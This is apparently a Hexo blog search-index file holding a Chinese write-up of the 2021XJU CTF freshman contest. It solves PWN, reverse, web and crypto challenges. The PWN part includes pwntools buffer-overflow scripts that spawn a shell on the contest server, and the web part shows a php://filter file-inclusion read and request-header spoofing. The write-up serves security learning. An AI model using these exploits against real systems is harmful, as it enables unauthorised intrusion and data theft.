@@ -1,0 +1,1221 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>2021XJU CTF新生赛WriteUp</title>
+    <url>/2021/10/25/2021xju-ctf%E6%96%B0%E7%94%9F%E8%B5%9Bwriteup/</url>
+    <content><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><hr>
+<h3 id="1-Pwn指北"><a href="#1-Pwn指北" class="headerlink" title="1.Pwn指北"></a>1.Pwn指北</h3><p>下载附件直接拉到最下面即可<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025000814837.png"
+                      alt="image-20211025000814837"
+                ></p>
+<h3 id="2-test-your-nc"><a href="#2-test-your-nc" class="headerlink" title="2.test your nc"></a>2.test your nc</h3><p>直接运行题目所给命令即可夺权-<strong>nc 116.62.221.105 10001</strong><br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025001335768.png"
+                      alt="image-20211025001335768"
+                ></p>
+<h3 id="3-RIP"><a href="#3-RIP" class="headerlink" title="3.RIP"></a>3.RIP</h3><p>下载附件rip,首先判断是多少位的程序:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025214737923.png"
+                      alt="image-20211025214737923"
+                ><br> 64位,放到IDA64中打开分析,找到main函数,F5反编译:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025215043784.png"
+                      alt="image-20211025215043784"
+                ></p>
+<hr>
+<p>程序定义了一个长32的s字符串用以获取用户输入,但是gets()函数无法判断用户输入了多少个字符,发现溢出点. 接下来找用以夺权的函数,在fun中发现了bin&#x2F;sh:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025215426081.png"
+                      alt="image-20211025215426081"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025221821849.png"
+                      alt="image-20211025221821849"
+                ><br> 转到汇编视图,发现程序在数据段中定义了command字符串,内容为”bin&#x2F;sh”,然后再0x4005BF这个地址将command放到了rdi寄存器中, 然后在后面调用了_system函数(call指令),因此溢出操作后写入0x4005BF这个地址就可以夺权了(以上为我的理解,不是很透彻也可能会有错误) 因此构建以下脚本:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;116.62.221.105&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>+<span class="number">8</span>)+p64(<span class="number">0x4005BF</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure></div>
+
+<p>执行脚本成功拿到flag<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025221711345.png"
+                      alt="image-20211025221711345"
+                ></p>
+<h3 id="4-level0"><a href="#4-level0" class="headerlink" title="4.level0"></a>4.level0</h3><p>下载附件检查信息,是个64位程序<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025222745285.png"
+                      alt="image-20211025222745285"
+                ><br> 拖到IDA64中分析找到main函数,F5反编译:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025223107306.png"
+                      alt="image-20211025223107306"
+                ><br> 双击进入函数:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025223210470.png"
+                      alt="image-20211025223210470"
+                ><br> 发现buf长度为128,read()函数允许我们输入0x200个长度的数据,比128大,可以进行溢出操作,然后找夺权函数:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025223934774.png"
+                      alt="image-20211025223934774"
+                ><br> 分析同上题一样,构建脚本:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;116.62.221.105&quot;</span>,<span class="number">10003</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">128</span>+<span class="number">8</span>)+p64(<span class="number">0x4011AA</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025224140038.png"
+                      alt="image-20211025224140038"
+                ><br> 得到flag</p>
+<h3 id="5-Guess-number"><a href="#5-Guess-number" class="headerlink" title="5.Guess number"></a>5.Guess number</h3><p>下载附件,分析为64位<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025224340577.png"
+                      alt="image-20211025224340577"
+                ><br> 拖到IDA64,分析:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025224510616.png"
+                      alt="image-20211025224510616"
+                ><br> 双击打开func():<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025224601703.png"
+                      alt="image-20211025224601703"
+                ><br> 发现只要有一个长度为56的v1字符串和一个浮点数v2,而且当v2&#x3D;11.28125,就可以拿到flag,但是发现我们输入的是v1,无法输入v2,继续分析:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025224816420.png"
+                      alt="image-20211025224816420"
+                ><br> 发现v1字符串的地址在-0x40,v2浮点数在-0x08的位置,我们可以将-0x40到-0x08全填满然后将11.28215赋给v2. 这里我们还需要将11.28215转换为16进制:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025225507436.png"
+                      alt="image-20211025225507436"
+                ><br> 在汇编视图,ucomiss比较指令后双击进入后面的数据可以找到11.28215的16进制表示:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025225745186.png"
+                      alt="image-20211025225745186"
+                ><br> 构造以下python脚本:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;116.62.221.105&quot;</span>,<span class="number">10004</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x8</span>)+p64(<span class="number">0x41348000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025225834268.png"
+                      alt="image-20211025225834268"
+                ></p>
+<hr>
+<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><hr>
+<h3 id="1-re签到"><a href="#1-re签到" class="headerlink" title="1.re签到"></a>1.re签到</h3><p>下载文件后解压得到<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025002846509.png"
+                      alt="image-20211025002846509"
+                ><br> 然后将其拖入到IDA中并且根据提示按Shift+F12得到如下视图,然后可在其中找到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025003021216.png"
+                      alt="image-20211025003021216"
+                ></p>
+<h3 id="2-game-switch"><a href="#2-game-switch" class="headerlink" title="2.game switch"></a>2.game switch</h3><p>下载附件得到<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025003204918.png"
+                      alt="image-20211025003204918"
+                ><br> 先直接运行<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025003241691.png"
+                      alt="image-20211025003241691"
+                ><br> 让输入0-8其中一个数(0为重启游戏),数据量不大直接先从1试到8,试到8时出现flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025003453306.png"
+                      alt="image-20211025003453306"
+                ></p>
+<h3 id="3-再用IDA签一次到"><a href="#3-再用IDA签一次到" class="headerlink" title="3.再用IDA签一次到"></a>3.再用IDA签一次到</h3><p>下载得到2.exe文件,直接拖入IDA分析,找到main函数,F5反编译:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025003726712.png"
+                      alt="image-20211025003726712"
+                ><br> 双击进入check_flag()函数,得到如下代码:</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">int64 __fastcall <span class="title function_">check_flag</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *a1 != <span class="number">120</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  result = (<span class="type">unsigned</span> __int8)a1[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">106</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> __int8)a1[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">117</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="type">unsigned</span> __int8)a1[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)result == <span class="number">123</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">unsigned</span> __int8)a1[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)result == <span class="number">66</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = (<span class="type">unsigned</span> __int8)a1[<span class="number">5</span>];</span><br><span class="line">          <span class="keyword">if</span> ( (_BYTE)result == <span class="number">105</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = (<span class="type">unsigned</span> __int8)a1[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">if</span> ( (_BYTE)result == <span class="number">110</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = (<span class="type">unsigned</span> __int8)a1[<span class="number">7</span>];</span><br><span class="line">              <span class="keyword">if</span> ( (_BYTE)result == <span class="number">97</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (<span class="type">unsigned</span> __int8)a1[<span class="number">8</span>];</span><br><span class="line">                <span class="keyword">if</span> ( (_BYTE)result == <span class="number">114</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  result = (<span class="type">unsigned</span> __int8)a1[<span class="number">9</span>];</span><br><span class="line">                  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">121</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    result = (<span class="type">unsigned</span> __int8)a1[<span class="number">10</span>];</span><br><span class="line">                    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">95</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      result = (<span class="type">unsigned</span> __int8)a1[<span class="number">11</span>];</span><br><span class="line">                      <span class="keyword">if</span> ( (_BYTE)result == <span class="number">83</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        result = (<span class="type">unsigned</span> __int8)a1[<span class="number">12</span>];</span><br><span class="line">                        <span class="keyword">if</span> ( (_BYTE)result == <span class="number">116</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          result = (<span class="type">unsigned</span> __int8)a1[<span class="number">13</span>];</span><br><span class="line">                          <span class="keyword">if</span> ( (_BYTE)result == <span class="number">97</span> )</span><br><span class="line">                          &#123;</span><br><span class="line">                            result = (<span class="type">unsigned</span> __int8)a1[<span class="number">14</span>];</span><br><span class="line">                            <span class="keyword">if</span> ( (_BYTE)result == <span class="number">110</span> )</span><br><span class="line">                            &#123;</span><br><span class="line">                              result = (<span class="type">unsigned</span> __int8)a1[<span class="number">15</span>];</span><br><span class="line">                              <span class="keyword">if</span> ( (_BYTE)result == <span class="number">100</span> )</span><br><span class="line">                              &#123;</span><br><span class="line">                                result = (<span class="type">unsigned</span> __int8)a1[<span class="number">16</span>];</span><br><span class="line">                                <span class="keyword">if</span> ( (_BYTE)result == <span class="number">95</span> )</span><br><span class="line">                                &#123;</span><br><span class="line">                                  result = (<span class="type">unsigned</span> __int8)a1[<span class="number">17</span>];</span><br><span class="line">                                  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">85</span> )</span><br><span class="line">                                  &#123;</span><br><span class="line">                                    result = (<span class="type">unsigned</span> __int8)a1[<span class="number">18</span>];</span><br><span class="line">                                    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">112</span> )</span><br><span class="line">                                    &#123;</span><br><span class="line">                                      result = (<span class="type">unsigned</span> __int8)a1[<span class="number">19</span>];</span><br><span class="line">                                      <span class="keyword">if</span> ( (_BYTE)result == <span class="number">125</span> )</span><br><span class="line">                                      &#123;</span><br><span class="line">                                        <span class="built_in">printf</span>(<span class="string">&quot;yes,this is a flag&quot;</span>);</span><br><span class="line">                                        getchar();</span><br><span class="line">                                        result = <span class="number">0</span>i64;</span><br><span class="line">                                      &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                  &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                              &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
+
+<p>经过分析可得程序将输入的v2字符串传到check_flag()函数的a1中,然后将a1[1]-a1[19]中的字符与一个ASCII码进行对比,若全部相等则输出yes,this is a flag. 因此判断将所有ASCII码转为字符连起来即可得到flag,实际中会得到 ju{xxxxxx},根据flag格式前面应该缺一个 x ,补上即为正确flag</p>
+<h3 id="4-Nizdy不喜欢玩游戏"><a href="#4-Nizdy不喜欢玩游戏" class="headerlink" title="4.Nizdy不喜欢玩游戏"></a>4.Nizdy不喜欢玩游戏</h3><p>下载文件FlappyflappyBird.exe,拖入IDA分析,找到main函数,F5反编译:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025004946233.png"
+                      alt="image-20211025004946233"
+                ><br> 题目说是玩到2021分就有flag,发现当score&gt;2020时会输出real[0]和src,双击这俩变量进入汇编视图查看变量内容,如图:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025005217219.png"
+                      alt="image-20211025005217219"
+                ><br> 可以很快发现src的内容与flag形式很像,猜测为凯撒密码,将其复制到凯撒密码解密器中枚举,得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025005433577.png"
+                      alt="image-20211025005433577"
+                ></p>
+<h3 id="5-easyre"><a href="#5-easyre" class="headerlink" title="5.easyre"></a>5.easyre</h3><p>下载解压得到easyre.txt,打开发现是c语言,简单分析一下:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025005923226.png"
+                      alt="image-20211025005923226"
+                ><br> 程序首先读入一个长度为21的<code>input</code>字符串,然后将input中的每个字符ASCII码减5,之后在与<code>&quot;SEPN@&gt;vR@G&gt;JH@ZOJZPNx&quot;</code>字符串进行比较,相同则输出<code>lucky!flag is your input</code>,于是编写c++语言脚本如下获得flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025010919597.png"
+                      alt="image-20211025010919597"
+                ></p>
+<hr>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><hr>
+<h3 id="1-robots"><a href="#1-robots" class="headerlink" title="1.robots"></a>1.robots</h3><p>打开题目链接直接访问robots.txt文件:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025011104880.png"
+                      alt="image-20211025011104880"
+                ><br> 根据robots内内容访问flaaaggg.php拿到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025011146021.png"
+                      alt="image-20211025011146021"
+                ></p>
+<h3 id="2-where-is-f1ag"><a href="#2-where-is-f1ag" class="headerlink" title="2.where is f1ag?"></a>2.where is f1ag?</h3><p>打开题目链接发现只有<code>FLAG is not here</code>,F12审查元素看看有没有什么提示:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025011328003.png"
+                      alt="image-20211025011328003"
+                ><br> 发现<code>flag in web.pdf</code>,访问web.pdf在最下面发现flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025011432030.png"
+                      alt="image-20211025011432030"
+                ></p>
+<h3 id="3-cookie"><a href="#3-cookie" class="headerlink" title="3.cookie"></a>3.cookie</h3><p>打开链接,根据题目提示直接F12查看cookie:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025011532460.png"
+                      alt="image-20211025011532460"
+                ><br> 发现URL编码过的flag,解码得到<code>XJUSEC&#123;you_find_C00kie!&#125;</code></p>
+<h3 id="4-get-post"><a href="#4-get-post" class="headerlink" title="4.get&amp;post"></a>4.get&amp;post</h3><p>打开题目链接发现以下PHP代码:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xju&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;xjusec&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;xju&#x27;</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;xjusec&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$a</span> === <span class="string">&#x27;welcome&#x27;</span> &amp;&amp; <span class="variable">$b</span> === <span class="string">&#x27;xju&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Do you know get&amp;post?&#x27;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>
+
+<p>简单分析可知服务器接收到一个<code>xju=welcome</code>的GET请求和<code>xjusec=xju</code>的POST请求即会执行<code>echo $flag</code>语句,按条件发送后得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025012219767.png"
+                      alt="image-20211025012219767"
+                ></p>
+<h3 id="5-绯红之王"><a href="#5-绯红之王" class="headerlink" title="5.绯红之王"></a>5.绯红之王</h3><p>打开题目链接发现有个名为<code>give me flag</code>访问地址为<code>/flag.php</code>的超级链接,点击后跳转到百度,猜测网页进行了重定向,flag就在flag.php中,于是利用linux下curl命令默认不跟随重定向的特点访问flag.php得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025012627955.png"
+                      alt="image-20211025012627955"
+                ></p>
+<h3 id="6-伪协议"><a href="#6-伪协议" class="headerlink" title="6.伪协议"></a>6.伪协议</h3><p>打开题目链接得到如下代码:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;Happy 1024&quot;</span>))&#123;</span><br><span class="line">  <span class="keyword">include</span>(<span class="variable">$b</span>);  <span class="comment">//flag.php</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>
+
+<p>简单分析代码,当<code>file_get_contents($a,&#39;r&#39;)</code>的值等于<code>&quot;Happy 1024&quot;</code>时可以执行<code>include($b)</code>语句,flag在flag.php文件中 首先访问flag.php:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025015138723.png"
+                      alt="image-20211025015138723"
+                ><br> 发现获取不了flag,根据题目提示,该题需要使用伪协议,首先试着访问phpinfo看看可以使用哪些伪协议,发现找不到phpinfo文件(可能是我没找到),于是我先试了试php:&#x2F;&#x2F;input伪协议进行传入<code>&quot;Happy 1024&quot;</code>使file_get_contents($a,’r’)得到的值为<code>Happy 1024</code>,如图:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025014223111.png"
+                      alt="image-20211025014223111"
+                ><br> 服务器返回<code>Warning: include(): Filename cannot be empty in /var/www/html/index.php</code>错误,意思是include()函数内容不能为空,这就意味着成功执行了<code>include($b)</code>语句,因为没有传b的值而报错. 也说明php:&#x2F;&#x2F;伪协议是可以用的.接下来来传b的值通过伪协议访问flag.php. 这里使用php:&#x2F;&#x2F;filter伪协议中的read,因为要得到<strong>php文件</strong>的源码,我们要对其进行base64编码,即<code>php://filter/read=convert.base64-encode/resource=flag.php</code>得到一串base64编码的字符串:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025015702488.png"
+                      alt="image-20211025015702488"
+                ><br> 对其解码得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025015757220.png"
+                      alt="image-20211025015757220"
+                ></p>
+<h3 id="7-Do-you-know-http"><a href="#7-Do-you-know-http" class="headerlink" title="7.Do you know http?"></a>7.Do you know http?</h3><p>打开题目链接得:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025015902356.png"
+                      alt="image-20211025015902356"
+                ><br> 于是使用burpsuite发送一个请求方法为<code>Ethe</code>的请求:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025020027910.png"
+                      alt="image-20211025020027910"
+                ><br> 提示”只有本地登陆才可以哦！”,然后加入X-Forwarded-For请求头,值为<code>127.0.0.1</code>:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025020244644.png"
+                      alt="image-20211025020244644"
+                ><br> 又提示”只有从<code>www.xjusec.com</code>过来的人才能看到下一步哦！”,加入Referer请求头,值为<code>www.xjusec.com</code> :<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025020511386.png"
+                      alt="image-20211025020511386"
+                ><br> 又**提示”你为什么不用’xju’这个官方浏览器！！” ,把User-Agent请求头的值改为xju得:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025020612135.png"
+                      alt="image-20211025020612135"
+                ><br> 终于拿到了flag!!!!</p>
+<hr>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><hr>
+<h3 id="1-Crypto指南"><a href="#1-Crypto指南" class="headerlink" title="1.Crypto指南"></a>1.Crypto指南</h3><p>下载附件CRYPTO.pdf,拉到最下面得到flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025153716169.png"
+                      alt="image-20211025153716169"
+                ></p>
+<h3 id="2-社会主义核心阿弥陀佛"><a href="#2-社会主义核心阿弥陀佛" class="headerlink" title="2.社会主义核心阿弥陀佛"></a>2.社会主义核心阿弥陀佛</h3><p>下载附件得到一个txt文件,里面内容为:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">诚信自由自由友善平等友善法治敬业友善平等友善爱国公正敬业友善平等诚信民主富强友善爱国诚信平等诚信民主友善公正敬业诚信富强友善爱国公正友善平等文明敬业敬业诚信自由平等友善平等友善法治爱国诚信文明友善爱国平等敬业和谐爱国公正诚信自由爱国爱国富强友善平等公正友善爱国法治友善平等友善法治友善平等富强友善爱国公正敬业敬业友善平等友善自由诚信自由公正爱国和谐诚信民主和谐友善爱国平等敬业富强爱国敬业诚信自由平等敬业和谐爱国公正友善爱国法治诚信富强自由敬业敬业友善爱国公正爱国和谐友善平等和谐友善爱国公正友善自由文明友善平等平等友善爱国公正诚信民主友善公正友善自由友善平等友善爱国平等敬业民主敬业富强友善爱国平等友善自由自由友善平等法治友善爱国公正敬业诚信民主诚信民主富强友善爱国法治敬业诚信富强友善自由自由诚信自由敬业爱国和谐诚信民主友善法治友善爱国爱国诚信富强爱国诚信民主公正诚信自由公正爱国富强诚信富强友善敬业友善爱国平等诚信民主友善爱国敬业法治友善爱国和谐爱国富强爱国文明诚信自由自由友善平等诚信自由爱国自由诚信自由自由友善平等诚信民主友善自由平等友善爱国公正爱国富强友善自由诚信平等友善爱国公正爱国富强敬业公正友善爱国自由诚信民主诚信平等诚信民主民主诚信自由公正敬业敬业友善平等诚信富强友善爱国公正爱国敬业爱国富强诚信自由平等爱国公正诚信富强平等诚信自由平等爱国诚信民主敬业诚信和谐友善爱国自由诚信民主友善爱国爱国自由友善爱国平等友善自由诚信平等诚信富强友善平等友善爱国公正爱国富强诚信富强诚信平等诚信自由公正敬业民主友善自由敬业友善爱国法治友善自由平等敬业诚信自由诚信自由自由友善平等诚信平等诚信民主民主诚信自由平等敬业文明敬业文明友善爱国法治敬业友善自由诚信富强自由友善爱国公正诚信民主诚信文明诚信富强友善平等诚信自由公正友善平等和谐友善自由文明友善爱国法治爱国自由友善自由民主诚信自由平等诚信富强自由诚信富强法治友善爱国公正爱国和谐诚信民主和谐诚信自由公正敬业平等友善平等爱国友善爱国公正友善平等公正爱国平等诚信自由平等敬业民主敬业富强友善爱国敬业爱国文明友善自由和谐友善爱国法治友善自由友善平等敬业诚信平等诚信自由公正诚信富强文明诚信民主平等诚信自由自由友善平等诚信民主诚信富强平等诚信自由爱国爱国爱国友善自由友善公正诚信自由平等诚信民主爱国敬业诚信和谐诚信自由法治诚信民主友善法治诚信民主富强诚信自由爱国敬业爱国爱国法治友善爱国公正友善自由友善法治友善平等友善平等诚信自由公正友善自由文明诚信民主平等诚信自由法治友善平等友善爱国友善自由友善敬业友善爱国法治友善平等诚信和谐友善平等富强友善爱国敬业爱国公正诚信富强诚信平等友善爱国平等敬业民主敬业富强诚信自由自由诚信民主诚信自由敬业友善法治诚信自由法治友善平等诚信和谐诚信民主富强诚信自由平等爱国友善敬业爱国和谐诚信自由平等诚信富强平等友善自由文明诚信自由法治友善自由平等敬业友善爱国友善爱国平等友善平等诚信自由敬业法治诚信自由爱国友善自由爱国友善平等公正诚信自由公正爱国富强友善自由诚信平等诚信自由敬业敬业敬业诚信富强自由诚信自由平等友善自由平等诚信富强文明诚信自由平等友善自由敬业爱国公正友善爱国平等友善自由诚信自由诚信富强自由 </span><br></pre></td></tr></table></figure></div>
+
+<p>以前在网上瞎看的时候看到一个”核心价值观编码”,于是拿上去解码得:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025154235376.png"
+                      alt="image-20211025154235376"
+                ><br> 根据题目提示和密文格式,判断是”与佛论禅”,拿上去解码得flag:<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="http://image.txg2333.top/2021/10/image-20211025154329740.png"
+                      alt="image-20211025154329740"
+                ></p>
